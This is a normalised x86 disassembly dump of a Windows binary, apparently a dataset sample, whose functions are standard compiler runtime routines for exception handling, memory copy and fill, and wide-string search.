mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_40ebf0
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
mov esp ebp
pop ebp
retn
sub_40d4cc
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x34 ] sub_40d76b
mov eax [ rw-data ]
lea ecx [ ebp - 0x38 ]
xor eax ecx
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x20 ] eax
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x14 ] 0x0
mov [ ebp - 0x1c ] esp
mov [ ebp - 0x18 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x8 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
call sub_40eb1b
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
call [ r--data ]
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x4 ]
pop ecx
pop ecx
and [ ebp - 0x8 ] 0x0
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x38 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
sub_40d5a9
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0xc ]
mov edx ecx
mov ebx [ edi + 0x10 ]
mov [ ebp - 0x4 ] ecx
test esi esi
js r-xdata
mov eax [ ebp + 0x14 ]
inc ecx
mov [ eax ] ecx
mov eax [ ebp + 0x18 ]
mov [ eax ] edx
cmp edx [ edi + 0xc ]
ja r-xdata
imul eax ecx 0x14
add eax 0x8
add eax ebx
call sub_42cf31
cmp ecx edx
ja r-xdata
mov edi [ ebp + 0x10 ]
sub eax 0x14
dec ecx
cmp [ eax - 0x4 ] edi
mov edi [ ebp + 0x8 ]
jge r-xdata
imul eax ecx 0x14
pop edi
pop esi
add eax ebx
pop ebx
mov esp ebp
pop ebp
retn
cmp ecx 0xffffffff
jne r-xdata
mov edi [ ebp + 0x10 ]
cmp edi [ eax ]
mov edi [ ebp + 0x8 ]
jle r-xdata
test esi esi
jns r-xdata
mov edx [ ebp - 0x4 ]
dec esi
mov [ ebp - 0x4 ] ecx
cmp ecx 0xffffffff
je r-xdata
sub_40d621
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_40d653
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call [ RtlUnwind@IAT ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40d6a8
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_40c3ae
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_40fc42
add esp 0x20
pop esi
pop ebp
retn
sub_40d6d9
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] ecx
call sub_40eb1b
mov ecx [ eax + 0x24 ]
mov [ esi + 0x4 ] ecx
call sub_40eb1b
mov [ eax + 0x24 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_40d6fd
push ebp
mov ebp esp
push esi
call sub_40eb1b
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x24 ]
jne r-xdata
call sub_40eb1b
mov ecx [ eax + 0x24 ]
jmp r-xdata
call sub_40eb1b
mov ecx [ esi + 0x4 ]
mov [ eax + 0x24 ] ecx
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp esi eax
je r-xdata
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx eax
call sub_42cf31
pop esi
pop ebp
retn
sub_40d745
push ebp
mov ebp esp
call sub_40eb1b
mov eax [ eax + 0x24 ]
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
cmp [ eax ] ecx
je r-xdata
sub_40d76b
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_40c3ae
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_40fc42
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_40d4cc
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_40d653
pop ebx
mov esp ebp
pop ebp
retn
sub_40d80a
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40fc42
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_40d840
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40fc42
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_40d876
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40fc42
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_40d8ac
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_40fea8
push [ esi + 0x1c ]
push [ esi + 0x28 ]
push 0x0
push [ esi + 0x18 ]
call sub_40fb2c
add esp 0x14
pop esi
pop ebp
retn 0x4
sub_40d8e0
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x20
jb r-xdata
cmp edi eax
jb r-xdata
and ecx 0x1f
je r-xdata
cmp ecx 0x80
jae r-xdata
lea esi [ ecx + esi ]
lea edi [ ecx + edi ]
cmp ecx 0x20
jb r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax ecx
shr ecx 0x2
je r-xdata
bt [ rw-data ] 0x1
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
test ecx 0xfffffffc
je r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
add edi 0x4
add esi 0x4
sub ecx 0x1
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
[ edi ] [ esi ]
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
test ecx ecx
je r-xdata
jmp r-xdata
test ecx ecx
je r-xdata
sub edi 0x4
sub esi 0x4
mov eax [ esi ]
mov [ edi ] eax
sub ecx 0x4
test ecx 0xfffffffc
jne r-xdata
test edi 0xf
je r-xdata
test edi 0x3
je r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov edx ecx
shr edx 0x5
test edx edx
je r-xdata
test edi 0x3
je r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
sub edi 0x1
sub esi 0x1
mov al [ esi ]
mov [ edi ] al
sub ecx 0x1
jne r-xdata
cmp ecx 0x80
jb r-xdata
dec ecx
dec esi
dec edi
mov al [ esi ]
mov [ edi ] al
test edi 0xf
jne r-xdata
cmp ecx 0x20
jb r-xdata
mov edx edi
and edx 0x3
sub ecx edx
lea esp [ esp ]
lea ecx [ ecx ]
test edi 0x3
jne r-xdata
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
lea ebx [ ebx ]
mov edx ecx
cmp ecx 0x20
jb r-xdata
mov al [ esi ]
mov [ edi ] al
dec ecx
add esi 0x1
add edi 0x1
test edi 0x3
jne r-xdata
cmp ecx 0x20
jb r-xdata
sub esi 0x80
sub edi 0x80
movdqu xmm0 [ esi ]
movdqu xmm1 [ esi + 0x10 ]
movdqu xmm2 [ esi + 0x20 ]
movdqu xmm3 [ esi + 0x30 ]
movdqu xmm4 [ esi + 0x40 ]
movdqu xmm5 [ esi + 0x50 ]
movdqu xmm6 [ esi + 0x60 ]
movdqu xmm7 [ esi + 0x70 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm1
movdqu [ edi + 0x20 ] xmm2
movdqu [ edi + 0x30 ] xmm3
movdqu [ edi + 0x40 ] xmm4
movdqu [ edi + 0x50 ] xmm5
movdqu [ edi + 0x60 ] xmm6
movdqu [ edi + 0x70 ] xmm7
sub ecx 0x80
test ecx 0xffffff80
jne r-xdata
mov edx ecx
shr ecx 0x2
and edx 0x3
sub esi 0x4
sub edi 0x4
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + r-xdata ]
mov al [ esi - 0x1 ]
mov [ edi - 0x1 ] al
dec esi
dec edi
sub edx 0x1
jne r-xdata
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
movdqu xmm0 [ esi ]
movdqu xmm1 [ esi + 0x10 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm1
lea esi [ esi + 0x20 ]
lea edi [ edi + 0x20 ]
dec edx
jne r-xdata
shr ecx 0x2
[ edi ] [ esi ]
and edx 0x3
jmp [ edx * 4 + r-xdata ]
sub esi 0x20
sub edi 0x20
movdqu xmm0 [ esi ]
movdqu xmm1 [ esi + 0x10 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm1
sub ecx 0x20
test ecx 0xffffffe0
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
lea esp [ esp ]
mov edi edi
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov edi edi
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + r-xdata ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_40de60
mov ecx [ esp + 0xc ]
movzx eax [ esp + 0x8 ]
mov edx edi
mov edi [ esp + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x4 ]
mov edi edx
retn
imul eax eax 0x1010101
cmp ecx 0x20
jle r-xdata
test ecx 0x3
je r-xdata
cmp ecx 0x80
jl r-xdata
test ecx 0x4
je r-xdata
mov [ edi ] al
inc edi
sub ecx 0x1
test ecx 0x3
jne r-xdata
bt [ rw-data ] 0x1
jae r-xdata
bt [ rw-data ] 0x1
jae r-xdata
test ecx 0xfffffff8
je r-xdata
mov [ edi ] eax
add edi 0x4
sub ecx 0x4
movd xmm0 eax
pshufd xmm0 xmm0 0x0
bt [ rw-data ] 0x1
jae r-xdata
[ edi ]
mov eax [ esp + 0x4 ]
mov edi edx
retn
lea esp [ esp ]
lea ebx [ ebx ]
lea edi [ ecx + edi - 0x20 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm0
mov eax [ esp + 0x4 ]
mov edi edx
retn
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm0
add edi 0x20
sub ecx 0x20
cmp ecx 0x20
jae r-xdata
movd xmm0 eax
pshufd xmm0 xmm0 0x0
add ecx edi
movups [ edi ] xmm0
add edi 0x10
and edi 0xfffffff0
sub ecx edi
cmp ecx 0x80
jle r-xdata
mov [ edi ] eax
mov [ edi + 0x4 ] eax
add edi 0x8
sub ecx 0x8
test ecx 0xfffffff8
jne r-xdata
test ecx 0x1f
je r-xdata
lea esp [ esp ]
lea esp [ esp ]
nop
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
sub ecx 0x80
test ecx 0xffffff00
jne r-xdata
jmp r-xdata
cmp ecx 0x20
jb r-xdata
sub_40dfba
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x28
push esi
push edi
mov edi [ ebx + 0xc ]
xor eax eax
movzx ecx [ edi ]
mov [ ebp - 0x8 ] ecx
cmp ax cx
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
jne r-xdata
mov eax edi
and eax 0xfff
push 0x2
pop esi
cmp eax 0xff0
ja r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
mov edx [ ebx + 0x8 ]
movzx eax [ edx ]
test ax ax
je r-xdata
movzx eax cx
pxor xmm3 xmm3
mov ecx [ ebx + 0x8 ]
push 0x2
pop esi
movd xmm0 eax
pshuflw xmm0 xmm0 0x0
pshufd xmm4 xmm0 0x0
push 0x8
pxor xmm0 xmm0
movzx ecx cx
pop edx
movups xmm0 [ edi ]
jmp r-xdata
xor eax eax
and [ ebp - 0x8 ] 0x0
mov ecx eax
mov eax edx
sub eax edi
mov [ ebp - 0x4 ] eax
push 0x2
pop esi
test cx cx
je r-xdata
movzx eax [ ecx ]
xor edx edx
cmp dx ax
je r-xdata
movups xmm1 [ ecx ]
movaps xmm0 xmm3
pcmpeqw xmm0 xmm1
pcmpeqw xmm1 xmm4
por xmm0 xmm1
pmovmskb eax xmm0
test eax eax
jne r-xdata
sub edx 0x1
jne r-xdata
add edi esi
movzx ecx [ edi ]
mov edx [ ebx + 0x8 ]
mov ecx [ ebp - 0x8 ]
movzx ecx [ edi ]
test cx cx
je r-xdata
movzx edx [ edi ]
cmp dx ax
jne r-xdata
bsf eax eax
mov [ ebp - 0x8 ] eax
shr eax 0x1
lea ecx [ ecx + eax * 2 ]
add ecx 0x10
jmp r-xdata
movzx eax cx
psrldq xmm0 0x2
pinsrw xmm0 eax 0x7
xor eax eax
cmp ax cx
je r-xdata
mov ecx [ ebp - 0x8 ]
movzx eax [ edx ]
xor edi edi
cmp di ax
je r-xdata
pcmpistri xmm0 [ edx ] 0xd
jbe r-xdata
mov eax edx
jmp r-xdata
mov edi [ ebx + 0xc ]
add edx esi
add eax esi
mov [ ebp - 0x4 ] eax
movzx ecx [ edx ]
test cx cx
jne r-xdata
movzx ecx [ eax + edi ]
movzx eax [ edi ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
jne r-xdata
add ecx esi
jmp r-xdata
mov edx ecx
mov eax ecx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
cmp ax cx
je r-xdata
jae r-xdata
add edx 0x10
cmp [ edi ] cx
je r-xdata
add edi esi
cmp [ eax + edi ] cx
jne r-xdata
movzx eax [ edi ]
and [ ebp - 0x8 ] 0x0
cmp [ ebp - 0x8 ] ax
je r-xdata
mov eax edx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
mov ecx [ ebx + 0xc ]
mov edi edx
add edx esi
jmp r-xdata
pcmpistri xmm0 [ edx ] 0xd
lea edx [ edx + ecx * 2 ]
mov eax edx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
jmp r-xdata
mov eax ecx
jmp r-xdata
cmp [ edx ] ax
jne r-xdata
movups xmm2 [ edi ]
movups xmm1 [ edx ]
movaps xmm0 xmm3
pcmpeqw xmm1 xmm2
pcmpeqw xmm0 xmm2
pcmpeqw xmm1 xmm3
por xmm1 xmm0
pmovmskb eax xmm1
test eax eax
jne r-xdata
movzx eax [ ecx ]
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x4 ] ax
je r-xdata
mov eax ecx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
mov edi [ ebx + 0xc ]
add edx esi
add edi esi
jmp r-xdata
bsf eax eax
mov [ ebp - 0x8 ] eax
and eax 0xfffffffe
add edx eax
add edi eax
add edx 0x10
add edi 0x10
jmp r-xdata
cmp [ edi ] ax
jne r-xdata
movups xmm1 [ ecx ]
pcmpistri xmm1 [ edi ] 0xd
jno r-xdata
mov eax edi
and eax 0xfff
cmp eax 0xff0
ja r-xdata
add edx esi
jmp r-xdata
add edi esi
add ecx esi
jmp r-xdata
js r-xdata
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov eax edi
mov [ ebp - 0x4 ] ecx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
mov ecx [ ebp - 0x4 ]
add edi 0x10
add ecx 0x10
jmp r-xdata
sub_40e23d
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] 0x2
jge r-xdata
mov edx [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx ecx
lea eax [ edx + 0x1 ]
test al 0xe
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
mov ax [ ebp + 0xc ]
movzx eax [ edx ]
cmp ax cx
jne r-xdata
xor eax eax
cmp ax cx
jne r-xdata
cmp [ ecx ] ax
jne r-xdata
cmp [ ecx ] ax
jne r-xdata
test ax ax
je r-xdata
mov esi edx
movzx eax cx
movd xmm0 eax
mov eax 0xffff0001
movd xmm1 eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ecx
jmp r-xdata
sub ecx 0x2
cmp ecx edx
je r-xdata
mov eax esi
add edx 0x2
je r-xdata
lea esi [ edx + ecx * 2 ]
movups xmm0 [ edx ]
pcmpistri xmm1 xmm0 0x15
jne r-xdata
pop esi
pop ebp
retn
add edx 0x10
jmp r-xdata
add edx 0x10
lea eax [ edx + ecx * 2 ]
jmp r-xdata
pcmpistri xmm0 [ edx ] 0x41
jae r-xdata
sub_40e2df
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
push esi
push edi
push [ ebp + 0x8 ]
call [ GetModuleFileNameW@IAT ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
retn
test eax eax
jne r-xdata
cmp eax esi
jne r-xdata
xor ecx ecx
mov [ edi ] cx
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ edi + esi * 2 - 0x2 ] ax
sub_40e348
push ebp
mov ebp esp
sub esp 0x24c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20c ]
push 0x104
push ecx
push eax
call sub_40e2df
add esp 0xc
cmp [ rw-data ] 0x5
jbe r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
push edi
push 0x2000
push 0x0
mov edi rw-data
push edi
call sub_40119b
add esp 0xc
test al al
je r-xdata
pop edi
lea eax [ ebp - 0x22c ]
push r--data
push eax
call sub_4010a7
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x21c ]
push eax
call sub_4010df
lea eax [ ebp - 0x24c ]
push eax
push 0x4
push 0x0
push 0x0
push r--data
push edi
call sub_4011d7
add esp 0x28
sub_40e3e4
push ebp
mov ebp esp
sub esp 0x24c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20c ]
push 0x104
push ecx
push eax
call sub_40e2df
add esp 0xc
cmp [ rw-data ] 0x5
jbe r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
push edi
push 0x2000
push 0x0
mov edi rw-data
push edi
call sub_40119b
add esp 0xc
test al al
je r-xdata
pop edi
lea eax [ ebp - 0x22c ]
push r--data
push eax
call sub_4010a7
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x21c ]
push eax
call sub_4010df
lea eax [ ebp - 0x24c ]
push eax
push 0x4
push 0x0
push 0x0
push r--data
push edi
call sub_4011d7
add esp 0x28
sub_40e4a0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0xc ]
add ecx edi
xor ecx [ eax + edi ]
pop edi
pop esi
pop ebp
jmp sub_40c3ae
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40c3ae
sub_40e4e0
push ebp
mov ebp esp
sub esp 0x1c
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov eax [ ebx + 0x8 ]
lea esi [ ebx + 0x10 ]
xor eax [ rw-data ]
push esi
push eax
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x8 ] eax
call sub_40e4a0
mov edi [ ebp + 0x10 ]
push edi
call sub_40fea7
mov eax [ ebp + 0x8 ]
add esp 0xc
test [ eax + 0x4 ] 0x66
jne r-xdata
cmp [ ebx + 0xc ] 0xfffffffe
je r-xdata
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x1c ]
mov [ ebp - 0x18 ] edi
mov edi [ ebx + 0xc ]
mov [ ebx - 0x4 ] eax
cmp edi 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push esi
mov ecx ebx
mov edx 0xfffffffe
call sub_4105d7
mov ecx [ ebp - 0x8 ]
lea eax [ edi + 0x2 ]
lea eax [ edi + eax * 2 ]
mov ebx [ ecx + eax * 4 ]
lea eax [ ecx + eax * 4 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x14 ] eax
test ecx ecx
je r-xdata
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_41058e
mov cl 0x1
mov [ ebp - 0x1 ] cl
test eax eax
js r-xdata
test cl cl
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jle r-xdata
jmp r-xdata
push esi
push [ ebp - 0x8 ]
